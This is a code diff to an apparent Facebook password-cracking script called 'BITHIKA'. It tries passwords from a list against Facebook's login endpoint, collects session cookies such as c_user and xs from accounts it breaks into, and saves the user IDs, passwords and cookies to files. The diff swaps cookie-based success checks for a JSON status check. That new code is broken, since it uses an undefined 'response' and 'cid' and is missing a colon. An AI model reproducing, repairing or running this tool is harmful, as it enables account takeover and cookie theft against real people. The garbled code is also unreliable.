@@ -1372,26 +1372,20 @@ def rndm4(uid,passlist):
 'x-asbd-id': '129477',
 'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
                         session.post(f'https://p.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
-                        log_cookies=session.cookies.get_dict().keys()
-                        if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                                        coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
-                                        cid = re.findall('c_user=(.*);xs', coki)[0]
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
-                                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(cid)
-                                        return True
-                        elif 'checkpoint' in log_cookies:
-                                        coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                                        coki1 = coki.split("1000")[1]
-                                        uid = "1000"+coki1[0:11]
-                                        print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
-                                        cps.append(uid)
-                                        return True
-                               
+                        if response.status_code == 200:
+                           json_response = response.json()
+                           if json_response.get('status') == 'ok':
+                               if json_response.get('login') == 'success'
+				   session_cookies = session.cookies.get_dict()
+				   coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
+				   print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
+				   print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
+				   open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+				   oks.append(cid)
+				   return True
                         else:
-                                        continue
+                               print(f"[ERROR] - Status code: {response.status_code}")
+                               continue
                 loop+=1
         except Exception as e:
                 pass
